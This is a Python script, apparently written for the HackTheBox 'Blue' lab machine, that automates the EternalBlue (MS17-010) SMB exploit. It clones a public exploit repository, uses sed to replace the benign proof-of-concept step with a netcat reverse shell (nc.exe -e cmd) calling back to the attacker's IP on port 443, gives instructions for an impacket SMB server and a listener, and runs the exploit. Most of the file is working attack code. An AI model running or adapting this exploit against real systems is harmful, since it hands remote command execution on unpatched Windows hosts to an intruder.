import sys, os, requests, re, subprocess
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Blue
    __________________________________________________________________________\n"""
    print(Fore.LIGHTMAGENTA_EX + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] Administrator", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.10.40" 

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://10.10.10.40 - (ms17-010)");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Active Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
# ---------------------------------------------------------------------------

def exploit_eternal_blue_system32():
    commands_send("git clone https://github.com/worawit/MS17-010/"); cm.sleep(.9)
    commands_send("cd MS17-010 && sed -i \"s~USERNAME = ''~USERNAME = 'guest'~\" checker.py")
    commands_send("cd MS17-010 && sed -i \"s~USERNAME = ''~USERNAME = 'guest'~\" zzz_exploit.py") 
    commands_send("cd MS17-010 && sed -i \"/print('creating file c:\\\\pwned.txt on the target')/d\" zzz_exploit.py")  
    commands_send("cd MS17-010 && sed -i \"/tid2 = smbConn.connectTree('C\\$')/d\" zzz_exploit.py")  
    commands_send("cd MS17-010 && sed -i \"/fid2 = smbConn.createFile(tid2, '\\/pwned.txt')/d\" zzz_exploit.py")  
    commands_send("cd MS17-010 && sed -i \"/smbConn.closeFile(tid2, fid2)/d\" zzz_exploit.py")  
    commands_send("cd MS17-010 && sed -i \"/smbConn.disconnectTree(tid2)/d\" zzz_exploit.py")
    commands_send(
        f"cd MS17-010 && sed -i '978s~.*~\tservice_exec(conn, r\"cmd /c \\\\\\\\{machine_ip}\\\\\\\\smbFolder\\\\\\\\nc.exe -e cmd {machine_ip} 443\")~' zzz_exploit.py"
    )
    print(tmsg,Fore.RED + f"[Exploit - Eternal Blue] > " + Fore.YELLOW + f"Download netcat.exe > " + Fore.LIGHTCYAN_EX + "https://eternallybored.org/misc/netcat/");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - Eternal Blue] > " + Fore.YELLOW + f"In other terminal type command > " + Fore.LIGHTCYAN_EX + "sudo impacket-smbserver smbFolder $(pwd) -smb2support");cm.sleep(.5)
    print(tmsg,Fore.RED + f"[Exploit - Eternal Blue] > " + Fore.YELLOW + f"In other terminal listen on port 443 > " + Fore.LIGHTCYAN_EX + "sudo nc -nlvp 443");cm.sleep(.5)
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [Exploit - Eternal Blue] > " + Fore.WHITE + f"Press ENTER if u ready...")
    commands_send("cd MS17-010 && python2.7 zzz_exploit.py 10.10.10.40 samr")
    print(tmsg,Fore.GREEN +f"[Exploit - Eternal Blue] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
# ---------------------------------------------------------------------------

def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","Administrator user connection"))
                print(tmsg,Fore.RED + f"[Exploit - Eternal Blue] > " + Fore.YELLOW + f"https://github.com/worawit/MS17-010/");cm.sleep(.5)
                exploit_eternal_blue_system32()
                break
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
